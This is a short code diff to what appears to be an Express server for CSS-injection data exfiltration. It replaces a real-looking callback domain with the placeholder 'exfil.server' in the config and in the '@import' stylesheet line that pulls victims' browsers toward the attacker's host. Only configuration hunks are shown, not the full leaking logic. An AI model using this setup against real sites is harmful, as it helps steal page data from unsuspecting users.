@@ -10,7 +10,7 @@ app.disable('etag');
 
 // Config
 const PORT = 3000;
-const HOSTNAME = "https://minh.monster";
+const HOSTNAME = "https://exfil.server";
 const PREFIX = '|';
 const CHARSET = "eoars nidtlcmup.@hbfgvwyjkqxzABCDEFGHIJKLMNOPQRSTUVWXYZ0189234576+!#=$^";
 const LOG = 4;
@@ -274,7 +274,7 @@ app.get('/:wildcard/css.css', (req, res) => {
 	console.log(minSelectorToTarget);
 	genSelectorArray();
 	res.setHeader('Content-Type', 'text/css');
-	res.send("@import 'https://minh.monster/start'");
+	res.send("@import 'https://exfil.server/start'");
 });
 
 app.get('/index.html', (req, res) => {
